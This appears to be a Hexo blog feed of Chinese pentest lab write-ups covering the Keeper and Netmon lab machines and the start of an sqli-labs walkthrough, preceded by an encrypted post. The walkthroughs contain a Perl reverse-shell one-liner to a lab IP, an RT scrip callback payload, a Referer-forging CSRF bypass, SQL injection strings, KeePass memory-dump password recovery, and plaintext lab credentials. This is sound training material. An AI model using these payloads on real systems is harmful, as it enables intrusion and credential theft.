b30c4d9205e1ef2a1fc0922469e684f32f7b52eef83c0297f6e6ecc5e747160621669b0e85a9b1431f02af2c350a71d41d17e8ffb9739f77b8219db91df5840aaf2ac48c6a7f9e07e00c5e922e02cf4a6134215ddaabf539bf18e09ea672a67523bbf5c0176eab583a4a064c6a028720f35b2e7476e7c00b80a76e52bdc2d947f4e84b295b584c862029658066aa48562070e42e5193dd5637ea3b00d29426624292e06ab8fd4acef49992fd1df58ac6010a353ae05b2c80f20ffb22ce5ef2ce52da91226d77557a34419b4a25ab1ced0e11334b5816f6fc0cf50a3d68f737b4a075789332c0f9c9c518743b19b4557a5ab0e6ed7804757fc6e409f55ffbfbfaa8a307354e71094a4322831aa4f9a953507cafe7995ec0d0cb57129d7852f244be6f11e3ce5b2c7d21605b47c1e3ba69ec5fda6f5fb5494c887fd83663d7294d31f25b5c69255ee271b4b1c459dcd4ecfbad361278ae7a687af9d94542680ab131c3e78fd9f8f634915c3be0cd537a6c0e84affb43a50497dc43f70d5b4a977906cc708e22186728a0bf4b3a3539536cf14e024a0e4bc7a2e637f671b63b56109537cc0fd8b38f34f33f3717dc04591b5cd9b3af99b17a5a7610cd01e5f76dbf05e032cb174705d511a4a1984037dd61a0a9de69abe10120387bfeb12c51f9cbd3959353d5dcdaa638f8f5d24d2bb3849f3816f31413bf96d49368fc8c31b6051f593b7d6fe8edfd8d39833fa10c8f0003bfe276fb00c8f65a2f9a78c241449da389b8579265171ec9ecf63393b9f021eaf1f138a3af49303b5f5ff43622dc30993a0ce351d8850c4942d80f6213408418f7a3fab55314ff78934c0b05c2cad8cacce9f668012cfafca30a9021d55848ed984c3d48ddb21de0b22cd6e728e53c2c8cb81c4ee9bcfbdbd9ac1ecb194a3aab9dba65c59189ba9d0928de8f756cc83231ea12402852e0aff5d9311eea4aa4bd8747c2fcb11ef4e2ccba0cc1fefb598643f9be096e08ec189e44b90eee4135c575c79df39aeae57cc8fad3ca851594cc81f09e55d4ab991da4fffad1eea7b504f5cc1f6b53b3d8376ed908a4399747dfcecd5d862cf8eaf7c41244951686cb81831c1e72c6bf5645d0fb6d6ea5379e1c0cf0ab1cdf2298772b7f724f6dc20a03f505d1cebe8cbef92ae28fa2d971a003b376005dd346da779b1c47cdcbe2d8d02621b3fc2d5d55bfd3592b31f4621c8be22df9805871fa0fdbf38f112dcc3d40720ca06a7bdc2eeb50b50aaf61f679f79e26c394985437fc9f2720c84c15f9d697a5de58b0b8da83a6b2d8d1d05287d092aa9051f7b8d19932eb5041a156e8848e174ec98f0076183276f2cda8ba5fe1b258b61837e032e0837f312cb3276443b56e8301f6346688db799c6d36972de95b60b6e7f9b1a4fcb1c22164b0fbcb94742d024656d79c03c3b8c71c49420566416fb01c1fdcb1b1d81ba6db21147a5ef6d0419d9cda3a05c6ba7b2fbc472020ff68bf31adf0cf4aeaa5317e3430b7ee1caf3a1acc400b8abc270496bf1e02cb41d296f80f7dc65603376d152feee679db294ca3df11e285fc842caebc4ad20df54468fd9f1ea8c2c6a089983f9f30ab4f9f027320279de0649a4e4432df6f4006faa8c83f841ee0d25354272250456e28de8f971d68f13110dbd6118ad9f8058b1b9e8dbe51be97751c21ffec305b3dd8cfc36e5a281e3264c6b4264030537943c529bbd19afe54c0dba5fdc035e651d5a7629dac263e7ba899c937c4ec981f36d4afd9ff5f2b08ce012ab45e664f7bd0b6387a80492d9c56e2243cdff9ec65bd54e51884c0031f27dec498d130d35477e21eba149b614deaa99041e0851833270baa8047c89f4becd5cc343e02466e01d291e0f2dcee6522609909d1afbce28c3c3bc30ccd2030b9304130d49cfa3c4e94a6743cc1fa37c587348a624cdf9287b8477c331506545f3d88ca73eb4a058c089146c8741979960c6e49e8eabe911aad033953b6c95a57b03ae4094da7867c7b32a119d321420dab7306130d4b2684cb5a818a0df3acf84b6d4a0d4d93fd779a04aaf903469f9b478563bf79f1000e391fdff6c81aecd5ac40d363170d76db1976a782f43f06f180fbe02e19a3295bee4df6fce6759443650e003c17f7b75f2f082b2896b72363760e7f68e57124728fa2df81434a053381ae0410feda47b25bb53847a03914e16629d512492175df6eea4daf5b250f9bfb50547aabe8aa28613fdd8d29d4a84ec6612ee0ead7198aa7a70dfa8cc2ea661493b33771b8129e767357a29f5d7b6992950ad8d9c16a0b03b06fd318b74c19e027dd33801e55c3023e660f95a3234ca466d53806a4bd720d49562421b7791d6f9410255059961de047b2c13b4a2997284e2ddb9664a84fcf35490da72c93b920a1708c80633127dc27fd7598f4967e7c451a766ef3a79edf1c4beb12adf0060b1b15d3f7b18dc04b2574b24c69098c7a227f649512fca31d6dc557812ddded59ab0b6da9d2a392a2a895a3e2da9af59f498fadcbdb652fd5cbbae95f681aa84f917fcd8ac79983a6fbfb2abead4e8b42433983c0f7523718edcb4ee7681483962f6519dd8d46ece3e4638c8cca711602218deaebcedd3edec2589062b8cac7471b7535cc168581ab6ed286f6bd294226002e8ba495b60332aa7d85e4e0412928468a3b5cd31733fcc6127477411bf6d44fe2bab3d2d52f696a68bfa29ae5f282a9c46361d36296a472dbbf86013ffe75bc46b1b274a48710d4ce2baa1a1c28ef555c5ddb90f336ac49700537b495c2138c0e75eeca90605f729bb8137db043553448964b8aca414aca387634ec001d5311180a2348e77539300e413c26f1992e1287cb5c1af9b5bcfd8b09cb4dccce281b0cadf68c4f92bd15c0fd0359368c5dc540ca547fe04696aa1e6f826c4d8cf2c0a93649358fea0719c9b7c9d8ef2239042acdc97351dd8c492066ed9645aaffd8678f961d26d9ce9965d017e9afb932831c9037e48a1e72bdb6f3eff5813811bb76e00f38cead58dbbc398b83d8b847f0a5d887e5c31d4a8b8bb7b5061f0f6b357d2e49c201c1bbd86db89a415710e43cec65246285413f913a7a9650b5f3ab5908f462a3d189a2f45b64fff2579c4ada39ff3d923dc39544fad8f0594eb606eb55d361c4962dc9d6432063226fddfd32c93f7a9342eca221d44e3eea25f768e2eb19559d0d60f72ce160fed0e15fec0915f9b4faf0f006afe7731112e2aba5e6a9ef6332daf78f15c0644b267aee99bdfef9f37e929f464981ddfef4951436f5f05d047adc81942f973165567370fdce138b06aa292b0b27c857d69972b82cf78872f08dd073c0b86c9a41f02dc7b39d84f2e556482decc5439904b1d57012b2c8c3acee7d608f298d4fe00d60c8d627d0823dde74291a1bd39c42fabb56dc244da1e3622930f09678ae7748aae12420b46e3c0ecf215c2a7522cfe6d950ffd72201fe41f018c3ebb2c44c9cb2257ecc9438e060d1dd52cd3a0611acd4a0ff54d9437339d9f3151a021dea0f7756ef56f801915be38569343c348cc92503a651b29f3b30542742ad3f9c09cc9e6abef6266169a0322926a3e1ee37452b4b30217309c8a06a95d0592f57289bde2481c7b2ea3be4330852d8456327c8c0007c24421e52f797a9caf08459a657a0fc7db76c7c133a57018f206b8aa136b390b1694efb207bf1245e66d05a91ce20f628de15d47d4faae83658c3a88cf53c849dbac10fe4f17d8c3df58f94b051a1ce05766b830d7724beb11f90dd35248f53563baade2655ec0a1f4e14f7b97db59007abff3cd30588e1ab3cf34a9794a73fabf8ea19d2490362f099484d163f21369a0cf9851aa015e7099563e2ea3ef56b1c1bb43214390c71944c19cb88812b407d35118684d3b9869ae76fe727baa2fc38a221244d11188cb1d56a43b3ddba6c60f0cc2162a0507ced7bf2414cf66302aeb6e117875a5b8a97c92fe00478a146bf78e5288dcc85fcc646a4432f83e1610891faa1eb40075403700fcf270fafaea9732fa8ed534a226574b7d181a692bf46dd0a505a3595b1fd4d29c258bf860c7b4bc6ea87fb4f4753aeaf9a4c975ed1bb7b3a9c06f609ba8f9b43a82dfeb690333ff8558ee7b41893013a1acd1f090039356195b698d8cd521ce26e14a4a86c0d79bec80793def53b7e03ecdf7cac6e91cde4eb73bc5cb6a8919dc54dbdcadc25c6f9cb7a16932905e4d27538f22176ebb254f3b18a091bfe860cf757257cbe0b521dac8c61a790d978ffe6f0b2648b8d4a8f1976f51edd07982fbeed4d215688f80e134bca4be2dbf3a819c7ebc4ea1dfd9e13ba8e77b12a3d92b78daf69f7aaf9dde9e37e897e3bd7a4b379920ff4d81e323381602233e6258a59b3ec189cccc6018c082b90285ec38f674306be08ae2e34aa465ab628c06ab079c22c085420ace97ca924c358e4ee16ad0e9fb110cb8ced369827804724b7e3d5342ac8beb948488eb4c08272dd2b8448214b5ccbdd0e83106829661f6043619eb0b81c65bbcf8e8cc5c85f360784a44af05f1ea2eff37916138b01640a60466f8137d7696364749fc77ae3621005bb72568b21c036304e028d49345ecf2ac9c3043f94266a572e051cc133e5efa3d26a2b16961bc2620c0651ab939351edea00b34cfcf74783d016af5737cc46b59d0571ab03f78e211ca5bf8a56d9ae01bff83964f5e139259d99eb3ad62fbb79d18baf7bff321140b67dcd72d03751c17d252632fcbdeb9da6a96e286c8770826edca814210a1661e7b757d3445483a05768afd58e5c0d6fde4cea905addbb6033e6a29d3bf1fcf5bc70753cef77647d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy L-Keeper</title>
      <link href="/2025/01/04/Easy%20L-Keeper/"/>
      <url>/2025/01/04/Easy%20L-Keeper/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>访问ip<br><img src="/Rxi134_FILE/0edca269088ac282555c43cb3f4d9fc8_MD5.jpeg"></p><p>在hosts添加两行</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">10.10.11.227 tickets.keeper.htb10.10.11.227 keeper.htb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问 tickets.keeper.htb&#x2F;<br><img src="/Rxi134_FILE/399868b5209eb9a8fafaed5f93184751_MD5.jpeg"></p><p>访问一下 keeper.htb&#x2F;， 就是之前跳转的界面</p><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><p>先简单扫下端口</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE    SERVICE22/tcp    open     ssh| ssh-hostkey:|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)25/tcp    open     smtp|_smtp-commands: Couldn't establish connection on port 2537/tcp    filtered time80/tcp    open     http| http-methods:|_  Supported Methods: GET HEAD|_http-title: Site doesn't have a title (text/html).110/tcp   open     pop3125/tcp   filtered locus-map444/tcp   filtered snpp514/tcp   filtered shell1105/tcp  filtered ftranhc1233/tcp  filtered univ-appserver1840/tcp  filtered netopia-vo22107/tcp  filtered msmq-mgmt2251/tcp  filtered dif-port2399/tcp  filtered fmpro-fdal3827/tcp  filtered netmpi3871/tcp  filtered avocent-adsap5033/tcp  filtered jtnetd-server5357/tcp  filtered wsdapi5560/tcp  filtered isqlplus5877/tcp  filtered unknown5961/tcp  filtered unknown6502/tcp  filtered netop-rc7070/tcp  filtered realserver8254/tcp  filtered unknown9000/tcp  filtered cslistener9002/tcp  filtered dynamid9900/tcp  filtered iua16113/tcp filtered unknown22939/tcp filtered unknown49999/tcp filtered unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>确定cms是 Best Practical Request Tracker (RT) ，版本 4.4.4+dfsg-2ubuntu1</p><h2 id="搜索默认密码"><a href="#搜索默认密码" class="headerlink" title="搜索默认密码"></a>搜索默认密码</h2><p>先网上搜索一下有没有默认密码<code>root:password</code><br><img src="/Rxi134_FILE/b6e3f5982dfbb4c5d0a77fbdf6613622_MD5.jpeg"></p><p>直接进来了<br><img src="/Rxi134_FILE/f9509d1c38b16a06a282a857c4933557_MD5.jpeg"></p><h2 id="绕过csrf检测"><a href="#绕过csrf检测" class="headerlink" title="绕过csrf检测"></a>绕过csrf检测</h2><p>网上没直接找到什么nday梭哈，先手测下，但是<br><img src="/Rxi134_FILE/6ce18498576394e69cd9e5cf826ce314_MD5.jpeg"></p><p>我的任何修改操作都会报这个错误，bp抓包看看<br><img src="/Rxi134_FILE/4db51177223fdd9aa4ae0dfa85313f35_MD5.jpeg"></p><p>有可能是只信任来自 keeper.htb 的请求，把referer改为 <code>http://keeper.htb/rt/Admin/Scrips/Create.html</code><br><img src="/Rxi134_FILE/a92106c2f60e1b613b8a52954d2554bb_MD5.jpeg"><br>这下好了</p><h2 id="创建并触发perl脚本反弹shell（失败）"><a href="#创建并触发perl脚本反弹shell（失败）" class="headerlink" title="创建并触发perl脚本反弹shell（失败）"></a>创建并触发perl脚本反弹shell（失败）</h2><p>在翻找后台的时候发现一个脚本管理器</p><p>我们在本地监听 1134端口，然后写入poc：</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">use</span> LWP<span class="token punctuation">:</span><span class="token punctuation">:</span>UserAgent<span class="token punctuation">;</span><span class="token keyword">use</span> HTTP<span class="token punctuation">:</span><span class="token punctuation">:</span>Request<span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$ua</span> <span class="token operator">=</span> LWP<span class="token punctuation">:</span><span class="token punctuation">:</span>UserAgent<span class="token operator">-></span>new<span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string">'http://10.10.14.2:1234'</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$request</span> <span class="token operator">=</span> HTTP<span class="token punctuation">:</span><span class="token punctuation">:</span>Request<span class="token operator">-></span>new<span class="token punctuation">(</span>GET <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token variable">$ua</span><span class="token operator">-></span>request<span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>讲解下面这几项参数：</p><ul><li><p>Condition（触发条件）：我设置为 On Create，也就是创建 ticket 时就会执行我们的poc</p></li><li><p>Action（要执行的脚本）：设为 User Defined 即可<br><img src="/Rxi134_FILE/ea2f8614e8718301c30a3bc810b9d6a0_MD5.jpeg"></p></li><li><p>Custom condition（自定义条件）：不填</p></li><li><p>Custom action preparation code</p></li><li><p>Custom action commit code<br><img src="/Rxi134_FILE/8e54038e03920fd76d07d688ac407b58_MD5.jpeg"></p></li></ul><p>然后创建ticket触发脚本<br><img src="/Rxi134_FILE/1fafc44b1cf26658a272a8d8921724c3_MD5.jpeg"></p><p>成功收到响应<br><img src="/Rxi134_FILE/394c80fe332f63edea170ab6014411ad_MD5.jpeg"></p><p>反弹 shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">perl <span class="token parameter variable">-e</span> <span class="token string">'use Socket;$i="10.10.14.2";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");&#125;;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是jb怎么都返回不回来shell…，难道是exec被禁了？</p><h2 id="备注ssh密码"><a href="#备注ssh密码" class="headerlink" title="*备注ssh密码"></a>*备注ssh密码</h2><blockquote><p>哎我真是服了</p></blockquote><p><img src="/Rxi134_FILE/775b52740b5730d11324fca0c41f5979_MD5.jpeg"></p><p>点进详细信息<br><img src="/Rxi134_FILE/d1118883a520707ef17c83a4abf76f45_MD5.jpeg"></p><p>这可能就是一组密码凭据：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">lnorgaard:Welcome2023!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ssh 连接<br><img src="/Rxi134_FILE/201ae9bf26d8856d553c56d97df691c4_MD5.jpeg"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>Linux keeper 5.15.0-78-generic</p><p>机器上就只有用户 lnorgaard 和 root</p><h2 id="linpeas"><a href="#linpeas" class="headerlink" title="linpeas"></a>linpeas</h2><p>没有找到什么有用的</p><h2 id="RT30000-zip"><a href="#RT30000-zip" class="headerlink" title="RT30000.zip"></a>RT30000.zip</h2><p>目录下有个压缩包挺突兀<br><img src="/Rxi134_FILE/bb27bd0701f988671f0bb1228ece6cf4_MD5.jpeg"><br><img src="/Rxi134_FILE/a30dc6faaff0a79c30f620eb346fb19f_MD5.jpeg"></p><h2 id="KeePass-CVE-2023-3278"><a href="#KeePass-CVE-2023-3278" class="headerlink" title="KeePass CVE-2023-3278"></a>KeePass CVE-2023-3278</h2><blockquote><p>keepass是一个密码管理器</p></blockquote><p>.kbdx 是 KeePass 的数据库文件</p><blockquote><p>当输入主密钥以解锁 KeePass 数据库时，输入框的值会存储在内存中。虽然使用 ‘●’ 字符将其视觉上隐藏，但最后一个字符在内存中短暂可见，并持续存储在那里（<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32784">CVE-2023-3278</a>，于 2023 年 6 月 3 日发布的 KeePass 2.54 中修复）</p></blockquote><p>工具地址：<a href="https://github.com/JorianWoltjer/keepass-dump-extractor/releases">Releases · JorianWoltjer&#x2F;keepass-dump-extractor</a></p><p><img src="/Rxi134_FILE/dc221b56b543932f4f3cfb13d7e29a00_MD5.jpeg"></p><p>把它复制下来</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">dgrødmedflødedgrdmedfldedgrodmedflode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是都不对</p><h3 id="密码推测"><a href="#密码推测" class="headerlink" title="密码推测"></a>密码推测</h3><p>看着感觉像个单词，网上搜索下<br><img src="/Rxi134_FILE/80942ebd2ed2b69db6662ab94064822a_MD5.jpeg"></p><p>有没有可能是</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">rødgrød med fløde<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>🐂，成功了！<br><img src="/Rxi134_FILE/6ff2c9276812481fb0ad8a1a203b46ed_MD5.jpeg"></p><p>这里面存储着root用户的密码<br><img src="/Rxi134_FILE/90c186d735963765e6b4868677a06a07_MD5.jpeg"></p><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><h3 id="密码连接（失败）"><a href="#密码连接（失败）" class="headerlink" title="密码连接（失败）"></a>密码连接（失败）</h3><p>查看sshd_config，允许root远程登录，但是禁用了密码认证<br><img src="/Rxi134_FILE/9a1e2c49b71b8722645f713a0a0f271e_MD5.jpeg"></p><h3 id="putty-转-openssh"><a href="#putty-转-openssh" class="headerlink" title="putty 转 openssh"></a>putty 转 openssh</h3><p>不过notes里还有存有putty的私钥，把其内容保存为 key.pkk<br><img src="/Rxi134_FILE/8abf5aa20115be76b8f576f4de9b4fc6_MD5.jpeg"></p><p>把 putty 转为 openssh 格式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ puttygen <span class="token string">'/mnt/c/Users/Anonymous/Desktop/key.ppk'</span> <span class="token parameter variable">-O</span> private-openssh <span class="token parameter variable">-o</span> id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接即可<br><img src="/Rxi134_FILE/48a3ad1cf809efaf68bf23c537f31339_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>没看wp就做出来了，不错</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy W-Netmon</title>
      <link href="/2025/01/01/Easy%20W-Netmon/"/>
      <url>/2025/01/01/Easy%20W-Netmon/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>80是个登录界面，PRTG？<br><img src="/Rxi134_FILE/a1496244f6df21b46da829111cb976f3_MD5.jpeg"></p><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">ORT      STATE    SERVICE        VERSION21/tcp    open     ftp            Microsoft ftpd| ftp-syst: |_  SYST: Windows_NT| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 02-02-19  11:18PM                 1024 .rnd| 02-25-19  09:15PM       &lt;DIR>          inetpub| 07-16-16  08:18AM       &lt;DIR>          PerfLogs| 02-25-19  09:56PM       &lt;DIR>          Program Files| 02-02-19  11:28PM       &lt;DIR>          Program Files (x86)| 02-03-19  07:08AM       &lt;DIR>          Users|_11-10-23  09:20AM       &lt;DIR>          Windows80/tcp    open     http           PRTG/18.1.37.13946|_http-trane-info: Problem with XML parsing of /evox/about|_http-server-header: PRTG/18.1.37.13946| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479| http-title: Welcome | PRTG Network Monitor (NETMON)|_Requested resource was /index.htm135/tcp   open     msrpc?139/tcp   open     netbios-ssn?445/tcp   open     microsoft-ds?668/tcp   filtered mecomm1051/tcp  filtered optima-vnet1071/tcp  filtered bsquare-voip3527/tcp  filtered beserver-msg-q3809/tcp  filtered apocd7019/tcp  filtered doceri-ctl48080/tcp filtered unknown49400/tcp filtered compaqdiagHost script results:| smb2-security-mode: |   3:1:1: |_    Message signing enabled but not required| smb2-time: |   date: 2024-12-28T14:09:28|_  start_date: 2024-12-28T14:05:11| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一看ftp可以匿名登录</p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><h2 id="ftp-匿名登录"><a href="#ftp-匿名登录" class="headerlink" title="ftp 匿名登录"></a>ftp 匿名登录</h2><p>可以登录上去，不过权限较低，无法上传文件</p><p>发现iis的网站目录 inetpub&#x2F;<br><img src="/Rxi134_FILE/3272a46bd945fac2bed958620dffec43_MD5.jpeg"></p><p>但是进去发现什么都没有？</p><p>倒是可以把&#x2F;Public下的flag下载下来</p><h2 id="回到网站-PRTG-monitor"><a href="#回到网站-PRTG-monitor" class="headerlink" title="回到网站 PRTG monitor"></a>回到网站 PRTG monitor</h2><p>我突然发现nmap对80端口是扫出来版本号的，PRTG&#x2F;18.1.37.13946</p><p>PRTG 是什么？<br><img src="/Rxi134_FILE/a4224f0187057f1e609e4322a757082f_MD5.jpeg"></p><p>查查有没有nday<br><img src="/Rxi134_FILE/c7a001f64a58634856264d1fdbaab954_MD5.jpeg"></p><p>还真有，但是需要先身份认证进去</p><h2 id="尝试弱口令登录"><a href="#尝试弱口令登录" class="headerlink" title="尝试弱口令登录"></a>尝试弱口令登录</h2><p>查下默认密码<br><img src="/Rxi134_FILE/966a2f54d47ada08c9a85905df3cc489_MD5.jpeg"></p><p>它有个忘记密码功能，对于非法用户名会报错，可以用来推测用户名<br><img src="/Rxi134_FILE/91f168d6ed9f6acf94bd118ef99cb6fb_MD5.jpeg"></p><p>测一下用户名 prtgadmin<br><img src="/Rxi134_FILE/503c57568057434426e139ab620b5fe1_MD5.jpeg"><br>哎，存在的<br><img src="/Rxi134_FILE/0f61055dbe7ef85a4e59af448b12b056_MD5.jpeg"></p><p>直接尝试 prtgadmin:prtgadmin，失败了…<br><img src="/Rxi134_FILE/1e58e187236f9a0b963ca947c265861c_MD5.jpeg"></p><p>爆破一波密码，p都没出来</p><h2 id="ftp翻找RPGT配置文件"><a href="#ftp翻找RPGT配置文件" class="headerlink" title="*ftp翻找RPGT配置文件"></a>*ftp翻找RPGT配置文件</h2><p>直接把整个目录给下载下来</p><p>可以用wget 下载文件夹，不过我还是喜欢用xshell可视化</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-r</span> ftp://anonymous:@10.10.10.152/<span class="token string">"Program Files (x86)"</span>/<span class="token string">"PRTG Network Monitor"</span>/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/adc2575bb0673605c0e02f79b76fe262_MD5.jpeg"></p><p>但是找半天啥都没找到。。。</p><p>查看wp，数据文件在<code>%programdata%\Paessler\PRTG Network Monitor</code>下<br><img src="/Rxi134_FILE/ef3aff51f8d1619c32680b8460a3e8ab_MD5.jpeg"><br>但是我没看到ProgramData&#x2F;目录啊？<br><img src="/Rxi134_FILE/cc5434b9176c1bbfa89938c8af097835_MD5.jpeg"></p><p>可以转入？！<br><img src="/Rxi134_FILE/bfee3dde4b27c7311a002c2db8fdeaa6_MD5.jpeg"></p><blockquote><p>隐藏受保护的系统文件：当你启用 “隐藏受保护的操作系统文件” 功能时，Windows 会隐藏一部分敏感的系统文件，防止这些文件被普通用户（或管理员）误操作。这通常是为了保护系统的完整性，确保操作系统和应用程序可以正常运行。即使这些文件被显示出来，Windows 仍然会阻止用户进行修改或删除。<br>常见的文件夹有 ProgramData&#x2F;、bootmgr&#x2F;、</p></blockquote><p>看到了一堆文件，先看.bak备份文件</p><p><img src="/Rxi134_FILE/de738317967f0ff86b9413fb9c3bc30e_MD5.jpeg"></p><p>找到一串密码！</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">prtgadmin:PrTg@dmin2018<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/d7faef30f52f8de2f0bde4b611bf35e7_MD5.jpeg"></p><p>啊？<br><img src="/Rxi134_FILE/ffbc80abb3266f25014109ddeef701c4_MD5.jpeg"></p><p>wp说根据不同的年份，可以联想到密码可能只是改成了2019</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">prtgadmin:PrTg@dmin2019<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/e1b98961b9ea506f3f35598f98d772b6_MD5.jpeg"></p><p>登陆成功<br><img src="/Rxi134_FILE/caae998d3b07fa81adfa2e221fe9151a_MD5.jpeg"></p><h2 id="CVE-2018-9276-Authenticated-Command-Injection"><a href="#CVE-2018-9276-Authenticated-Command-Injection" class="headerlink" title="CVE-2018-9276 Authenticated Command Injection"></a>CVE-2018-9276 Authenticated Command Injection</h2><p>msf可以直接打<br><img src="/Rxi134_FILE/87d17bcc221c6d41e1129a0be60bcbec_MD5.jpeg"></p><p><img src="/Rxi134_FILE/4dc9b688f7b550dc11671653aca639c4_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总的来说，我并不觉得这个机器非常简单，特别是找密码部分改年份的部分，有点脑洞</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL-labs靶场通关</title>
      <link href="/2024/12/28/sql-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/"/>
      <url>/2024/12/28/sql-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>靶场地址：<a href="https://buuoj.cn/challenges#sqli-labs">BUUCTF在线评测</a></p></blockquote><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>GET传参 ?id&#x3D;1<br><img src="/SNIPER_FILE/bf52f20479948ae3c94db8829592eb73_MD5.jpeg"></p><p>传参2回显不同，说明传入的参数是会进入数据库语句的</p><p><code>1&#39;</code> 单引号报错，这里有报错注入<br><img src="/SNIPER_FILE/0af604d9a444e02be20bb5d7b50ff5f8_MD5.jpeg"></p><p><code>1&#39;--+</code><br><img src="/SNIPER_FILE/ad4c34712b16f5da90aff0ecddc85a14_MD5.jpeg"></p><p>可以判断出是字符型且存在SQL注入</p><p>联合查询爆出列数，3列能正常回显</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1'UNION SELECT 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/1eb747fd3e620bdbb4ebbf430520d4cf_MD5.jpeg"></p><p>确定回显位<br><img src="/SNIPER_FILE/7b05974a10e1da5c1879c7ed8bbbd552_MD5.jpeg"></p><p>爆库，库名为 security </p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,database()--+<span aria-hidden="true" 